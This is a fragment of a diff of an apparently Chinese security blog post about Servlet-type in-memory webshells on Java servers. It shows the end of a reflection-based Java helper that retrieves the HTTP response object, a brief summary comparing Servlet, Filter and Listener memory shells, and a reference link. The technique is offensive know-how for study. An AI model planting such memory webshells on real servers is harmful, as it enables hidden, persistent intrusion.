class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line"> <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">var3</span> <span class="operator">=</span> var1.getClass().getDeclaredField(<span class="string">&quot;response&quot;</span>);  </span><br><span class="line"> var3.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> var2 = (HttpServletResponse)var3.get(var1);  </span><br><span class="line"> &#125; <span class="keyword">catch</span> (Exception var8) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                <span class="type">Field</span> <span class="variable">var4</span> <span class="operator">=</span> var1.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);  </span><br><span class="line"> var4.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> <span class="type">Object</span> <span class="variable">var5</span> <span class="operator">=</span> var4.get(var1);  </span><br><span class="line"> <span class="type">Field</span> <span class="variable">var6</span> <span class="operator">=</span> var5.getClass().getDeclaredField(<span class="string">&quot;response&quot;</span>);  </span><br><span class="line"> var6.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> var2 = (HttpServletResponse)var6.get(var5);  </span><br><span class="line"> &#125; <span class="keyword">catch</span> (Exception var7) &#123;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> var2;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 <h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>Servlet 型内存马相比于前几种的内存马，更容易被查杀出来，Filter 和 Listener 型内存马更改为简单粗暴，因为它们先于 Servlet 内存马之前插入。</p>
-<h2 id="0x06-参考资料"><a href="#0x06-参考资料" class="headerlink" title="0x06 参考资料"></a>0x06 参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://goodapple.top/archives/1355" >https://goodapple.top/archives/1355<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0x06-参考资料"><a href="#0x06-参考资料" class="headerlink" title="0x06 参考资料"></a>0x06 参考资料</h2><p><a class="link" target="_blank" rel="noopener" href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355<i class="fas fa-external-link-alt"></i></a></p>
 
             </div>
 
